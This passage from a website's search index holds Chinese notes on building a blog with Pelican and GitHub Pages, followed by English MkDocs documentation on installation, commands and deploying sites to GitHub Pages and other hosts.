\u82e5\u60a8\u8981\u521b\u5efa\u81ea\u5236\u4e3b\u9898\u6216\u8005\u4fee\u6539\u4e3b\u9898\uff0c\u8bf7\u53c2\u8003\uff1a Pelican theme","title":"Pelican"},{"location":"python/build_blogs_with_pelican/#pelican","text":"Build blogs with pelican and Github pages.","title":"\u4f7f\u7528Pelican\u642d\u5efa\u535a\u5ba2"},{"location":"python/build_blogs_with_pelican/#create-github-repo","text":"GitHub\u53ef\u4ee5\u6258\u7ba1\u5404\u79cdgit\u5e93\u7684\u7ad9\u70b9\u3002\u901a\u8fc7 GitHub Pages \u751f\u6210\u7684\u9759\u6001\u7ad9\u70b9\uff0c\u53ef\u4ee5\u514d\u8d39\u6258\u7ba1\u3001\u81ea\u5b9a\u4e49\u4e3b\u9898\u3001\u5e76\u4e14\u81ea\u5236\u7f51\u9875\u754c\u9762\u3002 \u9996\u5148\u5230Github\u8fdb\u884c\u8d26\u53f7\u6ce8\u518c\uff1a https://github.com/ \u3002 \u6ce8\u518c\u540e\u767b\u5f55Github\uff0c\u53f3\u4e0a\u89d2\u70b9\u51fb\u201cCreat a new repo\u201d\uff0c\u8df3\u8f6c\u5230\u65b0\u9875\u9762\u540e\u586b\u5199\u76f8\u5173\u5185\u5bb9\uff0c\u6ce8\u610f\u7248\u672c\u5e93\u540d\u4f7f\u7528'username.github.io'\u7684\u683c\u5f0f\uff0c\u8fd9\u91cc\u5c06 username \u66ff\u6362\u6210\u81ea\u5df1\u7684\u7528\u6237\u540d\u5373\u53ef\u3002 \u8bbe\u7f6e\u548c\u9009\u62e9\u597d\u9875\u9762\u6a21\u677f\u540e\u5c31\u53ef\u4ee5\u751f\u6210\u7136\u540e\u53d1\u5e03\u65b0\u7f51\u9875\u4e86\u3002 \u521b\u5efaSSH\u5bc6\u94a5\u5e76\u4e0a\u4f20\u5230Github\u3002 \u5173\u4e8eSSH\u8ba4\u8bc1\uff1a Windows/Linux/Mac\u4e0b\u4f7f\u7528SSH\u5bc6\u94a5\u8fde\u63a5Github \u5b98\u65b9\u6587\u6863\uff1a Github\u5b98\u65b9\u6587\u6863\u5728\u8fd9\u91cc","title":"\u521b\u5efaGithub\u4ed3\u5e93"},{"location":"python/build_blogs_with_pelican/#install-pelican","text":"Pelican \u662f\u4e00\u4e2a\u9759\u6001\u7ad9\u70b9\u751f\u6210\u5668\uff0c\u7528 Python \u7f16\u5199\u3002 \u901a\u8fc7\u5728\u9996\u9009\u7ec8\u7aef\u4e2d\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\uff0c\u5728 Python 3.6+ \u4e0a\u5b89\u88c5 Pelican\uff08\u5982\u679c\u60a8\u6253\u7b97\u4f7f\u7528\u5b83\uff0c\u8fd8\u53ef\u4ee5\u9009\u62e9 Markdown \uff09\uff1a $ python3 -m pip install \"pelican[markdown]\" \u5b98\u65b9\u6587\u6863\uff1a Pelican\u5b98\u65b9\u6587\u6863","title":"\u5b89\u88c5Pelican"},{"location":"python/build_blogs_with_pelican/#quickstart","text":"\u5c06 username.github.io \u9879\u76ee\u514b\u9686\u5230\u672c\u5730\uff0c\u5207\u6362\u5230\u8be5\u76ee\u5f55 $ git clone git@github.com:username/username.github.io.git $ cd username.github.io \u901a\u8fc7\u547d\u4ee4\u521b\u5efa\u4e00\u4e2a\u6846\u67b6\u9879\u76ee pelican-quickstart \uff0c\u9996\u5148\u8be2\u95ee\u6709\u5173\u60a8\u7f51\u7ad9\u7684\u4e00\u4e9b\u95ee\u9898\uff0c\u5bf9\u4e8e\u62ec\u53f7\u4e2d\u8868\u793a\u9ed8\u8ba4\u503c\u7684\u95ee\u9898\uff0c\u8bf7\u968f\u65f6\u4f7f\u7528 Return \u952e\u63a5\u53d7\u8fd9\u4e9b\u9ed8\u8ba4\u503c\u3002 \u8fd9\u4e9b\u95ee\u9898\u53ea\u662f\u7528\u6765\u751f\u6210\u914d\u7f6e\u6587\u4ef6\u7684\uff0c\u6211\u4eec\u540e\u9762\u90fd\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u6765\u624b\u52a8\u4fee\u6539\u8fd9\u4e9b\u8bbe\u7f6e\u3002\u6211\u586b\u5199\u7684\u5185\u5bb9\u5982\u4e0b\uff1a $ pelican-quickstart Welcome to pelican-quickstart v4.7.1. This script will help you create a new Pelican-based website. Please answer the following questions so this script can generate the files needed by Pelican. > Where do you want to create your new web site? [.] > What will be the title of this web site? Jerry\u2018s blog > Who will be the author of this web site? Jerry > What will be the default language of this web site? [en] > Do you want to specify a URL prefix? e.g., https://example.com (Y/n) n > Do you want to enable article pagination? (Y/n) > How many articles per page do you want? [10] > What is your time zone? [Europe/Rome] Asia/Shanghai > Do you want to generate a tasks.py/Makefile to automate generation and publishing? (Y/n) > Do you want to upload your website using FTP? (y/N) > Do you want to upload your website using SSH? (y/N) > Do you want to upload your website using Dropbox? (y/N) > Do you want to upload your website using S3? (y/N) > Do you want to upload your website using Rackspace Cloud Files? (y/N) > Do you want to upload your website using GitHub Pages? (y/N) y > Is this your personal page (username.github.io)? (y/N) y Done. Your new project is available at /home/jerry/Code/Jerry-se.github.io \u56de\u7b54\u5b8c\u6240\u6709\u95ee\u9898\u540e\uff0c\u9879\u76ee\u5c06\u5305\u542b\u4ee5\u4e0b\u5c42\u6b21\u7ed3\u6784\uff08 pages \u9664\u5916- \u663e\u793a\u5728\u4e0b\u9762\u7684\u62ec\u53f7\u4e2d - \u5982\u679c\u60a8\u8ba1\u5212\u521b\u5efa\u975e\u6309\u65f6\u95f4\u987a\u5e8f\u6392\u5217\u7684\u5185\u5bb9\uff0c\u60a8\u53ef\u4ee5\u9009\u62e9\u6dfb\u52a0\u81ea\u5df1\uff09\uff1a yourproject/ \u251c\u2500\u2500 content \u2502 \u2514\u2500\u2500 (pages) \u251c\u2500\u2500 output \u251c\u2500\u2500 tasks.py \u251c\u2500\u2500 Makefile \u251c\u2500\u2500 pelicanconf.py # Main settings file \u2514\u2500\u2500 publishconf.py # Settings to use when ready to publish \u4e0b\u4e00\u6b65\u662f\u5f00\u59cb\u5c06\u5185\u5bb9\u6dfb\u52a0\u5230\u4e3a\u60a8\u521b\u5efa\u7684\u5185\u5bb9\u6587\u4ef6\u5939\u4e2d\u3002","title":"\u5feb\u901f\u914d\u7f6e"},{"location":"python/build_blogs_with_pelican/#write-blog","text":"\u5728\u521b\u5efa\u4e00\u4e9b\u5185\u5bb9\u4e4b\u524d\uff0c\u60a8\u65e0\u6cd5\u8fd0\u884c Pelican\u3002\u4f7f\u7528\u60a8\u559c\u6b22\u7684\u6587\u672c\u7f16\u8f91\u5668\u521b\u5efa\u60a8\u7684\u7b2c\u4e00\u7bc7\u6587\u7ae0\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a Title: My super title Date: 2010-12-03 10:20 Modified: 2010-12-05 19:30 Category: Python Tags: pelican, publishing Slug: my-super-post Authors: Alexis Metaireau, Conan Doyle Summary: Short version for index and feeds This is the content of my super blog post. \u9274\u4e8e\u6b64\u793a\u4f8b\u6587\u7ae0\u4e3a Markdown \u683c\u5f0f\uff0c\u8bf7\u5c06\u5176\u53e6\u5b58\u4e3a username.github.io/content/xxxx.md \u5b98\u65b9\u6587\u6863\uff1a Pelican\u5199\u4f5c\u6587\u7ae0","title":"\u521b\u5efa\u6587\u7ae0"},{"location":"python/build_blogs_with_pelican/#build-blog","text":"\u4ece\u60a8\u7684\u9879\u76ee\u6839\u76ee\u5f55\u4e2d\uff0c\u8fd0\u884c pelican \u547d\u4ee4\u4ee5\u751f\u6210\u60a8\u7684\u7ad9\u70b9\uff1a pelican content \u60a8\u7684\u7ad9\u70b9\u73b0\u5df2\u5728 output/ \u76ee\u5f55\u4e2d\u751f\u6210\u3002\uff08\u60a8\u53ef\u80fd\u4f1a\u770b\u5230\u4e0e\u63d0\u8981\u76f8\u5173\u7684\u8b66\u544a\uff0c\u4f46\u5728\u672c\u5730\u5f00\u53d1\u65f6\u8fd9\u662f\u6b63\u5e38\u7684\uff0c\u73b0\u5728\u53ef\u4ee5\u5ffd\u7565\u3002\uff09 \u867d\u7136\u8be5 pelican \u547d\u4ee4\u662f\u751f\u6210\u7ad9\u70b9\u7684\u89c4\u8303\u65b9\u5f0f\uff0c\u4f46\u53ef\u4ee5\u4f7f\u7528\u81ea\u52a8\u5316\u5de5\u5177\u6765\u7b80\u5316\u751f\u6210\u548c\u53d1\u5e03\u6d41\u7a0b\u3002\u5728 pelican-quickstart \u8fd0\u884c\u8fc7\u7a0b\u4e2d\u63d0\u95ee\u662f\u5426\u8981\u81ea\u52a8\u5316\u7ad9\u70b9\u751f\u6210\u548c\u53d1\u5e03\u3002\u5982\u679c\u5bf9\u8be5\u95ee\u9898\u56de\u7b54\u201c\u662f\u201d\uff0c\u5219\u4f1a\u5728\u9879\u76ee\u7684\u6839\u76ee\u5f55\u4e2d\u751f\u6210\u4e00\u4e2a tasks.py \u548c Makefile \u3002\u8fd9\u4e9b\u6587\u4ef6\u9884\u5148\u586b\u5145\u4e86\u4ece pelican-quickstart \u8fc7\u7a0b\u4e2d\u63d0\u4f9b\u7684\u5176\u4ed6\u7b54\u6848\u4e2d\u6536\u96c6\u7684\u67d0\u4e9b\u4fe1\u606f\uff0c\u4f5c\u4e3a\u8d77\u70b9\uff0c\u5e94\u8fdb\u884c\u5b9a\u5236\u4ee5\u9002\u5408\u7684\u7279\u5b9a\u9700\u6c42\u548c\u4f7f\u7528\u6a21\u5f0f\u3002\u5982\u679c\u53d1\u73b0\u8fd9\u4e9b\u81ea\u52a8\u5316\u5de5\u5177\u4e2d\u7684\u4e00\u4e2a\u6216\u4e24\u4e2a\u7684\u5b9e\u7528\u6027\u6709\u9650\uff0c\u5219\u53ef\u4ee5\u968f\u65f6\u5220\u9664\u8fd9\u4e9b\u6587\u4ef6\uff0c\u5e76\u4e14\u4e0d\u4f1a\u5f71\u54cd\u89c4\u8303 pelican \u547d\u4ee4\u7684\u4f7f\u7528\u3002 \u4e0b\u9762\u4ecb\u7ecdPOSIX\u7cfb\u7edf\u4e2d\u4f7f\u7528 make \u6765\u751f\u6210\u548c\u53d1\u5e03\u7f51\u7ad9\uff0c\u60f3\u8981\u5728\u5e7f\u6cdb\u7684\u7cfb\u7edf\u73af\u5883\u4e2d\u4f7f\u7528\uff0c\u8bf7\u53c2\u8003\u6587\u6863\uff0c\u4f7f\u7528\u7531Python\u7f16\u5199\u7684 Invoke \u5de5\u5177\u3002 \u5982\u679c\u8981\u4f7f\u7528 pelicanconf.py \u4e2d\u8bbe\u7f6e\u7684 make \u751f\u6210\u7ad9\u70b9\uff0c\u8bf7\u8fd0\u884c\uff1a make html \u8981\u751f\u6210\u7528\u4e8e\u751f\u4ea7\u7684\u7ad9\u70b9\uff0c\u8bf7\u4f7f\u7528 publishconf.py \u4e2d\u7684\u8bbe\u7f6e\uff0c\u8fd0\u884c\uff1a make publish \u5982\u679c\u60a8\u5e0c\u671b Pelican \u5728\u6bcf\u6b21\u68c0\u6d4b\u5230\u66f4\u6539\u65f6\u81ea\u52a8\u91cd\u65b0\u751f\u6210\u60a8\u7684\u7ad9\u70b9\uff08\u8fd9\u5728\u672c\u5730\u6d4b\u8bd5\u65f6\u5f88\u65b9\u4fbf\uff09\uff0c\u8bf7\u6539\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1a make regenerate \u4e3a\u751f\u6210\u7684\u7ad9\u70b9\u63d0\u4f9b\u670d\u52a1\uff0c\u4ee5\u4fbf\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u4e2d\u7684 http://localhost:8000/ \u8fdb\u884c\u9884\u89c8\uff1a make serve \u901a\u5e38\uff0c\u60a8\u9700\u8981\u5728\u4e24\u4e2a\u5355\u72ec\u7684\u7ec8\u7aef\u4f1a\u8bdd\u4e2d\u8fd0\u884c make regenerate \u548c make serve \uff0c\u4f46\u60a8\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u540c\u65f6\u8fd0\u884c\u4e24\u8005\uff1a make devserver \u4e0a\u8ff0\u547d\u4ee4\u5c06\u540c\u65f6\u4ee5\u518d\u751f\u6a21\u5f0f\u8fd0\u884c Pelican \u5e76\u5728 http://localhost:8000 \u5904\u63d0\u4f9b\u8f93\u51fa\u3002 \u5f53\u60a8\u51c6\u5907\u597d\u53d1\u5e03\u60a8\u7684\u7f51\u7ad9\u65f6\uff0c\u60a8\u53ef\u4ee5\u901a\u8fc7\u60a8\u5728 pelican-quickstart \u8c03\u67e5\u95ee\u5377\u4e2d\u9009\u62e9\u7684\u65b9\u6cd5\u4e0a\u4f20\u5b83\u3002\u5bf9\u4e8e\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u5c06\u4f7f\u7528 rsync over ssh\uff1a make rsync_upload \u5b98\u65b9\u6587\u6863\uff1a Pelican\u53d1\u5e03\u7f51\u7ad9","title":"\u751f\u6210\u53d1\u5e03\u7f51\u7ad9"},{"location":"python/build_blogs_with_pelican/#publish-blog-to-github","text":"GitHub pages \u6709 \u4e24\u79cd\u7c7b\u578b \uff1a \u9879\u76ee\u9875\u9762\u548c\u7528\u6237\u9875\u9762\u3002Pelican \u7ad9\u70b9\u53ef\u4ee5\u53d1\u5e03\u4e3a\u9879\u76ee\u9875\u9762\u548c\u7528\u6237\u9875\u9762\u3002\u53ef\u4ee5\u4f7f\u7528 pip \u5b89\u88c5\u7684\u4f18\u79c0\u7684 ghp-import \u8ba9\u8fd9\u4e2a\u8fc7\u7a0b\u53d8\u5f97\u975e\u5e38\u7b80\u5355\u3002 $ python3 -m pip install ghp-import \u5982\u4e0a\u5728 pelican-quickstart \u4e2d\u8be2\u95ee\u662f\u5426\u4f7f\u7528 Github Pages \u4e0a\u4f20\u60a8\u7684\u7f51\u7ad9\u548c\u662f\u5426\u662f\u60a8\u7684\u4e2a\u4eba\u9875\u9762 <username>.github.io \uff0c\u6211\u9009\u62e9\u4e86\u662f\u3002\u5f53\u6211\u9700\u8981\u5c06 Pelican \u751f\u6210\u7684 output \u4e2d\u7684\u5185\u5bb9\u63a8\u9001\u5230 GitHub \u4e0a\u7684\u5b58\u50a8\u5e93\u7684 master \u5206\u652f\u4e2d\u65f6\uff0c\u53ea\u9700\u8981\u8fd0\u884c\u547d\u4ee4\uff1a make github \u56e0\u4e3a\u6211\u60f3\u5c06\u6587\u7ae0\u548cPelican\u914d\u7f6e\u4e0a\u4f20\u5230Github\u7684\u4e3b\u5206\u652f\u4e0a\uff0c\u5c06\u751f\u6210\u7684\u9875\u9762\u4e0a\u4f20\u5230 gh-pages \u5206\u652f\u4e0a\uff0c\u7136\u540e\u8ba9 Github Pages \u6258\u7ba1\u663e\u793a gh-pages \u5206\u652f\u4e0a\u7684\u7f51\u7ad9\u3002\u6240\u4ee5\u6211\u5c06 Makefile \u6587\u4ef6\u4e2d\u7684\u53d8\u91cf\"GITHUB_PAGES_BRANCH\"\u7684\u503c\u4ece\"main\"\u4fee\u6539\u4e3a\"gh-pages\"\uff0c\u7136\u540e\u8fd0\u884c make github \u3002\u8fd9\u6837\u6211\u7684\u6240\u6709\u6587\u7ae0\u3001Pelican\u548c\u535a\u5ba2\u9875\u9762\u90fd\u653e\u5728 username.github.io \u9879\u76ee\u4e2d\u4e86\u3002 \u6709\u5173\u9879\u76ee\u9875\u9762\u548c\u7528\u6237\u9875\u9762\u7684\u5176\u4ed6\u8bbe\u7f6e\uff0c\u8bf7\u53c2\u8003\uff1a Pelican\u53d1\u5e03\u5230Github pages","title":"\u53d1\u5e03\u5230Github"},{"location":"python/build_blogs_with_pelican/#pelican-themes","text":"\u6709\u4e00\u4e2a\u7531\u793e\u533a\u7ba1\u7406\u7684 Pelican \u4e3b\u9898 \u5b58\u50a8\u5e93\uff0c\u4f9b\u4eba\u4eec\u5171\u4eab\u548c\u4f7f\u7528\uff0c\u73b0\u573a\u7248\u672c\u53ef\u4ee5\u5728 http://www.pelicanthemes.com \u770b\u5230\u3002 \u53ef\u4ee5\u5728\u914d\u7f6e\u6587\u4ef6 pelicanconf.py \u4e2d\u8bbe\u7f6e\u4e3b\u9898\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u4e3b\u9898\u6587\u4ef6\u5939\u7684\u76f8\u5bf9\u6216\u7edd\u5bf9\u8def\u5f84\uff0c\u4e5f\u53ef\u4ee5\u662f\u9ed8\u8ba4\u4e3b\u9898\u7684\u540d\u79f0\u6216\u901a\u8fc7 pelican-themes \u5b89\u88c5\u7684\u4e3b\u9898\u3002\u82e5\u8981\u67e5\u8be2\u5df2\u5b89\u88c5\u7684\u4e3b\u9898\uff0c\u8bf7\u4f7f\u7528 pelican-themes -l \u547d\u4ee4\u3002\u4ee5\u4e0b\u662f\u6307\u5b9a\u9996\u9009\u4e3b\u9898\u7684\u793a\u4f8b\u65b9\u6cd5\uff1a # Specify name of a built-in theme THEME = \"notmyidea\" # Specify name of a theme installed via the pelican-themes tool THEME = \"chunk\" # Specify a customized theme, via path relative to the settings file THEME = \"themes/mycustomtheme\" # Specify a customized theme, via absolute path THEME = \"/home/myuser/projects/mysite/themes/mycustomtheme\" \u5185\u7f6e notmyidea \u4e3b\u9898\u53ef\u4ee5\u5f88\u597d\u5730\u5229\u7528\u4ee5\u4e0b\u8bbe\u7f6e\u3002\u4e5f\u53ef\u4ee5\u968f\u610f\u5728\u60a8\u7684\u4e3b\u9898\u4e2d\u4f7f\u7528\u5b83\u4eec\u3002 \u82e5\u60a8\u8981\u521b\u5efa\u81ea\u5236\u4e3b\u9898\u6216\u8005\u4fee\u6539\u4e3b\u9898\uff0c\u8bf7\u53c2\u8003\uff1a Pelican theme","title":"\u8bbe\u7f6e\u4e3b\u9898"},{"location":"python/mkdocs/","text":"Welcome to MkDocs \uf0c1 For full documentation visit mkdocs.org . Install \uf0c1 jerry@jerry:~$ python --version Python 2.7.17 jerry@jerry:~$ python3 --version Python 3.6.9 jerry@jerry:~$ pip --version pip 21.3.1 from /home/jerry/.local/lib/python3.6/site-packages/pip (python 3.6) jerry@jerry:~$ pip install mkdocs Defaulting to user installation because normal site-packages is not writeable Requirement already satisfied: mkdocs in ./.local/lib/python3.6/site-packages (1.3.0) Requirement already satisfied: importlib-metadata>=4.3 in ./.local/lib/python3.6/site-packages (from mkdocs) (4.8.3) Requirement already satisfied: pyyaml-env-tag>=0.1 in ./.local/lib/python3.6/site-packages (from mkdocs) (0.1) Requirement already satisfied: watchdog>=2.0 in ./.local/lib/python3.6/site-packages (from mkdocs) (2.1.7) Requirement already satisfied: packaging>=20.5 in ./.local/lib/python3.6/site-packages (from mkdocs) (21.3) Requirement already satisfied: ghp-import>=1.0 in ./.local/lib/python3.6/site-packages (from mkdocs) (2.0.2) Requirement already satisfied: Markdown>=3.2.1 in ./.local/lib/python3.6/site-packages (from mkdocs) (3.3.6) Requirement already satisfied: click>=3.3 in /usr/lib/python3/dist-packages (from mkdocs) (6.7) Requirement already satisfied: PyYAML>=3.10 in /usr/lib/python3/dist-packages (from mkdocs) (3.12) Requirement already satisfied: Jinja2>=2.10.2 in ./.local/lib/python3.6/site-packages (from mkdocs) (3.0.3) Requirement already satisfied: mergedeep>=1.3.4 in ./.local/lib/python3.6/site-packages (from mkdocs) (1.3.4) Requirement already satisfied: python-dateutil>=2.8.1 in ./.local/lib/python3.6/site-packages (from ghp-import>=1.0->mkdocs) (2.8.2) Requirement already satisfied: typing-extensions>=3.6.4 in ./.local/lib/python3.6/site-packages (from importlib-metadata>=4.3->mkdocs) (4.0.1) Requirement already satisfied: zipp>=0.5 in ./.local/lib/python3.6/site-packages (from importlib-metadata>=4.3->mkdocs) (3.6.0) Requirement already satisfied: MarkupSafe>=2.0 in ./.local/lib/python3.6/site-packages (from Jinja2>=2.10.2->mkdocs) (2.0.1) Requirement already satisfied: pyparsing!=3.0.5,>=2.0.2 in ./.local/lib/python3.6/site-packages (from packaging>=20.5->mkdocs) (3.0.8) Requirement already satisfied: six>=1.5 in ./.local/lib/python3.6/site-packages (from python-dateutil>=2.8.1->ghp-import>=1.0->mkdocs) (1.16.0) jerry@jerry:~$ mkdocs --version mkdocs, version 1.3.0 from /home/jerry/.local/lib/python3.6/site-packages/mkdocs (Python 3.6) Commands \uf0c1 mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs -h - Print help message and exit. Project layout \uf0c1 mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files. Theming our documentation \uf0c1 Edit the mkdocs.yml file and add a theme setting: site_name: MkLorum site_url: https://example.com/ nav: - Home: index.md - About: about.md theme: readthedocs Deploying our docs \uf0c1 GitHub Pages \uf0c1 If you host the source code for a project on GitHub , you can easily use GitHub Pages to host the documentation for your project. There are two basic types of GitHub Pages sites: Project Pages sites, and User and Organization Pages sites. They are nearly identical but have some important differences, which require a different work flow when deploying. Github Project Pages \uf0c1 Project Pages sites are simpler as the site files get deployed to a branch within the project repository ( gh-pages by default). After you checkout the primary working branch (usually master ) of the git repository where you maintain the source documentation for your project, run the following command: mkdocs gh-deploy That's it! Behind the scenes, MkDocs will build your docs and use the ghp-import tool to commit them to the gh-pages branch and push the gh-pages branch to GitHub. Use mkdocs gh-deploy --help to get a full list of options available for the gh-deploy command. Github Organization and User Pages \uf0c1 User and Organization Pages sites are not tied to a specific project, and the site files are deployed to the master branch in a dedicated repository named with the GitHub account name. Therefore, you need working copies of two repositories on our local system. For example, consider the following file structure: my-project/ mkdocs.yml docs/ orgname.github.io/ After making and verifying updates to your project you need to change directories to the orgname.github.io repository and call the mkdocs gh-deploy command from there: cd ../orgname.github.io/ mkdocs gh-deploy --config-file ../my-project/mkdocs.yml --remote-branch master Note that you need to explicitly point to the mkdocs.yml configuration file as it is no longer in the current working directory. You also need to inform the deploy script to commit to the master branch. You may override the default with the remote_branch configuration setting, but if you forget to change directories before running the deploy script, it will commit to the master branch of your project, which you probably don't want. Custom Domains \uf0c1 GitHub Pages includes support for using a Custom Domain for your site. In addition to the steps documented by GitHub, you need to take one additional step so that MkDocs will work with your custom domain. You need to add a CNAME file to the root of your docs_dir . The file must contain a single bare domain or subdomain on a single line (see MkDocs' own CNAME file as an example). You may create the file manually, or use GitHub's web interface to set up the custom domain (under Settings / Custom Domain). If you use the web interface, GitHub will create the CNAME file for you and save it to the root of your \"pages\" branch. So that the file does not get removed the next time you deploy, you need to copy the file to your docs_dir . With the file properly included in your docs_dir , MkDocs will include the file in your built site and push it to your \"pages\" branch each time you run the gh-deploy command. If you are having problems getting a custom domain to work, see GitHub's documentation on Troubleshooting custom domains . Other Providers \uf0c1 Any hosting provider which can serve static files can be used to serve documentation generated by MkDocs. While it would be impossible to document how to upload the docs to every hosting provider out there, the following guidelines should provide some general assistance. When you build your site (using the mkdocs build command), all of the files are written to the directory assigned to the site_dir configuration option (defaults to \"site\" ) in your mkdocs.yaml config file. Generally, you will simply need to copy the contents of that directory to the root directory of your hosting provider's server. Depending on your hosting provider's setup, you may need to use a graphical or command line ftp , ssh or scp client to transfer the files. For example, a typical set of commands from the command line might look something like this: mkdocs build scp -r ./site user@host:/path/to/server/root Of course, you will need to replace user with the username you have with your hosting provider and host with the appropriate domain name. Additionally, you will need to adjust the /path/to/server/root to match the configuration of your hosts' file system. See your host's documentation for specifics. You will likely want to search their documentation for \"ftp\" or \"uploading site\". Local Files \uf0c1 Rather than hosting your documentation on a server, you may instead distribute the files directly, which can then be viewed in a browser using the file:// scheme. Note that, due to the security settings of all modern browsers, some things will not work the same and some features may not work at all. In fact, a few settings will need to be customized in very specific ways. site_url : The site_url must be set to an empty string, which instructs MkDocs to build your site so that it will work with the file:// scheme. site_url: \"\" use_directory_urls : Set use_directory_urls to false . Otherwise, internal links between pages will not work properly. use_directory_urls: false search : You will need to either disable the search plugin, or use a third-party search plugin which is specifically designed to work with the file:// scheme. To disable all plugins, set the plugins setting to an empty list. plugins: [] If you have other plugins enabled, simply ensure that search is not included in the list. When writing your documentation, it is imperative that all internal links use relative URLs as documented . Remember, each reader of your documentation will be using a different device and the files will likely be in a different location on that device. If you expect your documentation to be viewed off-line, you may also need to be careful about which themes you choose. Many themes make use of CDNs for various support files, which require a live Internet connection. You will need to choose a theme which includes all support files directly in the theme. When you build your site (using the mkdocs build command), all of the files are written to the directory assigned to the site_dir configuration option (defaults to \"site\" ) in your mkdocs.yaml config file. Generally, you will simply need to copy the contents of that directory and distribute it to your readers. Alternatively, you may choose to use a third party tool to convert the HTML files to some other documentation format. 404 Pages \uf0c1 When MkDocs builds the documentation it will include a 404.html file in the build directory . This file will be automatically used when deploying to GitHub but only on a custom domain. Other web servers may be configured to use it but the feature won't always be available. See the documentation for your server of choice for more information.","title":"MkDocs"},{"location":"python/mkdocs/#welcome-to-mkdocs","text":"For full documentation visit mkdocs.org .","title":"Welcome to MkDocs"},{"location":"python/mkdocs/#install","text":"jerry@jerry:~$ python --version Python 2.7.17 jerry@jerry:~$ python3 --version Python 3.6.9 jerry@jerry:~$ pip --version pip 21.3.1 from /home/jerry/.local/lib/python3.6/site-packages/pip (python 3.6) jerry@jerry:~$ pip install mkdocs Defaulting to user installation because normal site-packages is not writeable Requirement already satisfied: mkdocs in ./.local/lib/python3.6/site-packages (1.3.0) Requirement already satisfied: importlib-metadata>=4.3 in ./.local/lib/python3.6/site-packages (from mkdocs) (4.8.3) Requirement already satisfied: pyyaml-env-tag>=0.1 in ./.local/lib/python3.6/site-packages (from mkdocs) (0.1) Requirement already satisfied: watchdog>=2.0 in ./.local/lib/python3.6/site-packages (from mkdocs) (2.1.7) Requirement already satisfied: packaging>=20.5 in ./.local/lib/python3.6/site-packages (from mkdocs) (21.3) Requirement already satisfied: ghp-import>=1.0 in ./.local/lib/python3.6/site-packages (from mkdocs) (2.0.2) Requirement already satisfied: Markdown>=3.2.1 in ./.local/lib/python3.6/site-packages (from mkdocs) (3.3.6) Requirement already satisfied: click>=3.3 in /usr/lib/python3/dist-packages (from mkdocs) (6.7) Requirement already satisfied: PyYAML>=3.10 in /usr/lib/python3/dist-packages (from mkdocs) (3.12) Requirement already satisfied: Jinja2>=2.10.2 in ./.local/lib/python3.6/site-packages (from mkdocs) (3.0.3) Requirement already satisfied: mergedeep>=1.3.4 in ./.local/lib/python3.6/site-packages (from mkdocs) (1.3.4) Requirement already satisfied: python-dateutil>=2.8.1 in ./.local/lib/python3.6/site-packages (from ghp-import>=1.0->mkdocs) (2.8.2) Requirement already satisfied: typing-extensions>=3.6.4 in ./.local/lib/python3.6/site-packages (from importlib-metadata>=4.3->mkdocs) (4.0.1) Requirement already satisfied: zipp>=0.5 in ./.local/lib/python3.6/site-packages (from importlib-metadata>=4.3->mkdocs) (3.6.0) Requirement already satisfied: MarkupSafe>=2.0 in ./.local/lib/python3.6/site-packages (from Jinja2>=2.10.2->mkdocs) (2.0.1) Requirement already satisfied: pyparsing!=3.0.5,>=2.0.2 in ./.local/lib/python3.6/site-packages (from packaging>=20.5->mkdocs) (3.0.8) Requirement already satisfied: six>=1.5 in ./.local/lib/python3.6/site-packages (from python-dateutil>=2.8.1->ghp-import>=1.0->mkdocs) (1.16.0) jerry@jerry:~$ mkdocs --version mkdocs, version 1.3.0 from /home/jerry/.local/lib/python3.6/site-packages/mkdocs (Python 3.6)","title":"Install"},{"location":"python/mkdocs/#commands","text":"mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs -h - Print help message and exit.","title":"Commands"},{"location":"python/mkdocs/#project-layout","text":"mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files.","title":"Project layout"},{"location":"python/mkdocs/#theming-our-documentation","text":"Edit the mkdocs.yml file and add a theme setting: site_name: MkLorum site_url: https://example.com/ nav: - Home: index.md - About: about.md theme: readthedocs","title":"Theming our documentation"},{"location":"python/mkdocs/#deploying-our-docs","text":"","title":"Deploying our docs"},{"location":"python/mkdocs/#github-pages","text":"If you host the source code for a project on GitHub , you can easily use GitHub Pages to host the documentation for your project. There are two basic types of GitHub Pages sites: Project Pages sites, and User and Organization Pages sites. They are nearly identical but have some important differences, which require a different work flow when deploying.","title":"GitHub Pages"},{"location":"python/mkdocs/#github-project-pages","text":"Project Pages sites are simpler as the site files get deployed to a branch within the project repository ( gh-pages by default). After you checkout the primary working branch (usually master ) of the git repository where you maintain the source documentation for your project, run the following command: mkdocs gh-deploy That's it! Behind the scenes, MkDocs will build your docs and use the ghp-import tool to commit them to the gh-pages branch and push the gh-pages branch to GitHub. Use mkdocs gh-deploy --help to get a full list of options available for the gh-deploy command.","title":"Github Project Pages"},{"location":"python/mkdocs/#github-organization-and-user-pages","text":"User and Organization Pages sites are not tied to a specific project, and the site files are deployed to the master branch in a dedicated repository named with the GitHub account name. Therefore, you need working copies of two repositories on our local system. For example, consider the following file structure: my-project/ mkdocs.yml docs/ orgname.github.io/ After making and verifying updates to your project you need to change directories to the orgname.github.io repository and call the mkdocs gh-deploy command from there: cd ../orgname.github.io/ mkdocs gh-deploy --config-file ../my-project/mkdocs.yml --remote-branch master Note that you need to explicitly point to the mkdocs.yml configuration file as it is no longer in the current working directory. You also need to inform the deploy script to commit to the master branch. You may override the default with the remote_branch configuration setting, but if you forget to change directories before running the deploy script, it will commit to the master branch of your project, which you probably don't want.","title":"Github Organization and User Pages"},{"location":"python/mkdocs/#custom-domains","text":"GitHub Pages includes support for using a Custom Domain for your site. In addition to the steps documented by GitHub, you need to take one additional step so that MkDocs will work with your custom domain. You need to add a CNAME file to the root of your docs_dir . The file must contain a single bare domain or subdomain on a single line (see MkDocs' own CNAME file as an example). You may create the file manually, or use GitHub's 